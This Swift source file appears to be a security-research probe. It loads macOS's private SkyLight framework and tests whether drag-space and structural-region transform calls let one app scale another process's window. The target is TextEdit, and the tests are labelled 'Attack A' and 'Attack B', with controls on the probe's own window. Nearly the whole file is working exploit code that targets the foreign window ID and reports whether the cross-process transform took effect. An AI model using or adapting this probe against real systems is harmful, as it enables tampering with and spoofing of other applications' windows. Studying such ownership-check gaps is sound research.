/// Probe07 — Drag-space pipeline: AddWindowToDraggingSpace + SetWindowDragTransform
///
/// Both functions have NO CGSWindowGetMappedImpl client-side ownership check
/// (confirmed via full disassembly). The pipeline:
///
///   1. SLSPackagesAddWindowToDraggingSpace(cid, foreignWID)   — msgid 0x75E8
///      Body includes WID. No ownership check client-side.
///
///   2. SLSPackagesSetWindowDragTransform(cid, ?, &tx, 0, 0.0) — msgid 0x76C9
///      Applies transform to ALL windows in the drag space (no WID in body).
///      No ownership check client-side.
///
/// Also tests SLSStructuralRegionSetChildRegionTransform (msgid 0x76C0):
///   - x0: cid, x1: region_id, x2: &tx
///   - Validates transform, then sends mach msg — no CGSWindowGetMappedImpl
///   - We pass foreign WID as region_id to see if it maps
///
/// Control: first test both on OUR OWN window to confirm the mechanism works at all.

import AppKit
import SkyLightBridge

let lib = dlopen("/System/Library/PrivateFrameworks/SkyLight.framework/SkyLight", RTLD_LAZY)!
func sym<T>(_ name: String) -> T { unsafeBitCast(dlsym(lib, name)!, to: T.self) }

// SLSPackagesAddWindowToDraggingSpace(cid, wid) -> Void
typealias AddToDragSpaceFn = @convention(c) (Int32, CGWindowID) -> Void
let addToDragSpace: AddToDragSpaceFn = sym("SLSPackagesAddWindowToDraggingSpace")

// SLSPackagesRemoveWindowFromDraggingSpace(cid, wid) -> Void
typealias RemoveFromDragSpaceFn = @convention(c) (Int32, CGWindowID) -> Void
let removeFromDragSpace: RemoveFromDragSpaceFn = sym("SLSPackagesRemoveWindowFromDraggingSpace")

// SLSPackagesSetWindowDragTransform(cid, wid_or_0, *tx, int64, float) -> Void
// NOTE: x1 is NOT stored in message body — drag transform applies to all dragged windows
typealias SetDragTransformFn = @convention(c) (Int32, CGWindowID, UnsafePointer<CGAffineTransform>, Int64, CGFloat) -> Void
let setDragTransform: SetDragTransformFn = sym("SLSPackagesSetWindowDragTransform")

// SLSPackagesRemoveWindowDragTransform(cid, wid_or_0, wid_or_0, int64, float) -> Void
typealias RemoveDragTransformFn = @convention(c) (Int32, CGWindowID, CGWindowID, Int64, CGFloat) -> Void
let removeDragTransform: RemoveDragTransformFn = sym("SLSPackagesRemoveWindowDragTransform")

// SLSStructuralRegionSetChildRegionTransform(cid, regionID, *tx) -> Int32
typealias StructuralRegionTransformFn = @convention(c) (Int32, UInt64, UnsafePointer<CGAffineTransform>) -> Int32
let structuralRegionTransform: StructuralRegionTransformFn = sym("SLSStructuralRegionSetChildRegionTransform")

let ourCID = SLSMainConnectionID()
print("CID: \(ourCID)")

// ─────────────────────────────────────────────────────────────────────────────
// AppKit setup — need a real window to participate in compositor
// ─────────────────────────────────────────────────────────────────────────────

class AppDelegate: NSObject, NSApplicationDelegate {
    var ourWindow: NSWindow!

    func applicationDidFinishLaunching(_ notification: Notification) {
        ourWindow = NSWindow(
            contentRect: NSRect(x: 200, y: 200, width: 600, height: 400),
            styleMask: [.titled, .closable, .resizable],
            backing: .buffered,
            defer: false)
        ourWindow.title = "Probe07 Drag Test"
        ourWindow.backgroundColor = .blue
        ourWindow.makeKeyAndOrderFront(nil)

        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
            self.runTests()
        }
    }

    func runTests() {
        let ourWID = windowID(for: ourWindow)
        print("Our WID: \(ourWID)")

        // Find TextEdit
        guard let teApp = NSRunningApplication
            .runningApplications(withBundleIdentifier: "com.apple.TextEdit").first else {
            print("TextEdit not running — launch it"); exit(1)
        }
        teApp.activate(options: [])
        Thread.sleep(forTimeInterval: 0.5)

        let wlist = CGWindowListCopyWindowInfo([.optionOnScreenOnly, .excludeDesktopElements], kCGNullWindowID)
            as? [[CFString: Any]] ?? []
        guard let info = wlist.first(where: {
            ($0[kCGWindowOwnerPID as CFString] as? Int32) == teApp.processIdentifier &&
            ($0[kCGWindowLayer as CFString] as? Int32 ?? 99) == 0
        }), let teWID = info[kCGWindowNumber as CFString] as? CGWindowID else {
            print("No TextEdit window found"); exit(1)
        }
        print("TextEdit WID: \(teWID)")
        print("")

        let scale = CGAffineTransform(scaleX: 0.5, y: 0.5)

        // ── CONTROL: AddWindowToDraggingSpace + SetDragTransform on OUR OWN window ──
        print("=== CONTROL: Drag-space transform on OUR OWN window ===")
        print("  Adding our window to drag space...")
        addToDragSpace(ourCID, ourWID)
        Thread.sleep(forTimeInterval: 0.3)

        print("  Applying drag transform (0.5x)...")
        withUnsafePointer(to: scale) { setDragTransform(ourCID, ourWID, $0, 0, 0.0) }
        Thread.sleep(forTimeInterval: 1.5)

        var ourTx = CGAffineTransform.identity
        SLSGetWindowTransform(ourCID, ourWID, &ourTx)
        print("  OUR window SLSGetWindowTransform readback: a=\(ourTx.a)")
        print("  (Watch screen: is our blue window visually scaled?)")
        print("  [\(abs(ourTx.a - 0.5) < 0.01 ? "DRAG TX IN COMPOSITOR!" : "no compositor change — drag tx may be separate layer")]")

        // Cleanup control
        var identity = CGAffineTransform.identity
        withUnsafePointer(to: identity) { p in removeDragTransform(ourCID, ourWID, ourWID, 0, 0.0) }
        removeFromDragSpace(ourCID, ourWID)
        Thread.sleep(forTimeInterval: 0.5)
        print("")

        // ── ATTACK A: AddWindowToDraggingSpace + SetDragTransform on TextEdit ──
        print("=== Attack A: Drag-space transform cross-process ===")
        print("  Adding TextEdit (wid=\(teWID)) to OUR drag space...")
        addToDragSpace(ourCID, teWID)
        Thread.sleep(forTimeInterval: 0.5)

        print("  Applying drag transform to drag space (0.5x)...")
        withUnsafePointer(to: scale) { setDragTransform(ourCID, teWID, $0, 0, 0.0) }
        Thread.sleep(forTimeInterval: 2.0)

        var teTx = CGAffineTransform.identity
        SLSGetWindowTransform(ourCID, teWID, &teTx)
        let teApplied = abs(teTx.a - 0.5) < 0.01
        print("  TextEdit SLSGetWindowTransform readback: a=\(teTx.a)")
        print("  [\(teApplied ? "APPLIED — CROSS-PROCESS DRAG TRANSFORM WORKS!" : "no compositor change")]")
        print("  (Watch screen: is TextEdit visually scaled?)")
        print("  Holding 3 seconds to observe...")
        Thread.sleep(forTimeInterval: 3.0)

        // Cleanup
        withUnsafePointer(to: identity) { p in removeDragTransform(ourCID, teWID, teWID, 0, 0.0) }
        removeFromDragSpace(ourCID, teWID)
        Thread.sleep(forTimeInterval: 0.5)
        print("  Cleaned up TextEdit drag transform")
        print("")

        // ── ATTACK B: SLSStructuralRegionSetChildRegionTransform with WID as regionID ──
        print("=== Attack B: SLSStructuralRegionSetChildRegionTransform (WID as regionID) ===")
        let r = withUnsafePointer(to: scale) {
            structuralRegionTransform(ourCID, UInt64(teWID), $0)
        }
        Thread.sleep(forTimeInterval: 1.0)
        var teTx2 = CGAffineTransform.identity
        SLSGetWindowTransform(ourCID, teWID, &teTx2)
        print("  status=\(r)  readback a=\(teTx2.a)")
        print("  (1000 = invalid transform passed; 0 = accepted; other = ownership rejection)")
        print("  [\(r == 0 ? "Message sent — check screen!" : r == 1000 ? "transform invalid" : "server rejected status=\(r)")]")

        // Also try with our own window
        print("")
        print("=== Control B: SLSStructuralRegionSetChildRegionTransform on OUR window ===")
        let r2 = withUnsafePointer(to: scale) {
            structuralRegionTransform(ourCID, UInt64(ourWID), $0)
        }
        Thread.sleep(forTimeInterval: 1.0)
        var ourTx2 = CGAffineTransform.identity
        SLSGetWindowTransform(ourCID, ourWID, &ourTx2)
        print("  status=\(r2)  readback a=\(ourTx2.a)")
        withUnsafePointer(to: identity) { _ = structuralRegionTransform(ourCID, UInt64(ourWID), $0) }
        print("")

        print("=== Summary ===")
        print("Control — drag transform on own window: readback.a=\(ourTx.a)")
        print("Attack A — drag transform cross-process: readback.a=\(teTx.a)  [\(teApplied ? "APPLIED!" : "blocked")]")
        print("Attack B — structuralRegion cross-proc:  status=\(r)  readback.a=\(teTx2.a)")
        print("Control B — structuralRegion own window: status=\(r2)  readback.a=\(ourTx2.a)")

        exit(0)
    }
}

let app = NSApplication.shared
app.setActivationPolicy(.regular)
let delegate = AppDelegate()
app.delegate = delegate
app.run()
